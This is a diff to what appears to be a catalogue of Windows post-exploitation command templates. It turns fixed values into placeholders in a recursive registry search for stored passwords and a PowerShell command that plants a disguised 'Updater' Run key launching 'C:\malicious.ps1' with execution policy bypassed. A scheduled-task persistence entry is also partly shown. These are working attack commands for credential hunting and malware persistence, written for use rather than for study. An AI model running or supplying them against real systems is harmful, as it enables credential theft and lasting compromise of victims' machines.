@@ -164,7 +164,7 @@ schtasks /query /fo LIST /v
 Recursively search HKLM for the string "password".
 
 ```bash
-reg query HKLM /f password /t REG_SZ /s
+reg query {{HIVE:str:HKLM}} /f "{{PATTERN:str:password}}" /t REG_SZ /s
 ```
 
 <!-- meta: risk=low | phase=post | tags=registry,password,search -->
@@ -307,7 +307,7 @@ schtasks /create /tn "{{NAME:str:Updater}}" /tr "powershell.exe -ExecutionPolicy
 Add a registry Run value for current-user persistence.
 
 ```bash
-powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{{NAME:str:Updater}}' -Value '{{CMD:str:powershell.exe -ExecutionPolicy Bypass -File C:\\malicious.ps1}}'"
+powershell -c "Set-ItemProperty -Path 'HKCU:\\{{KEYPATH:str:Software\\Microsoft\\Windows\\CurrentVersion\\Run}}' -Name '{{NAME:str:Updater}}' -Value '{{CMD:str:powershell.exe -ExecutionPolicy Bypass -File C:\\malicious.ps1}}'"
 ```
 
 <!-- meta: risk=high | phase=post | tags=registry,run,persistence -->
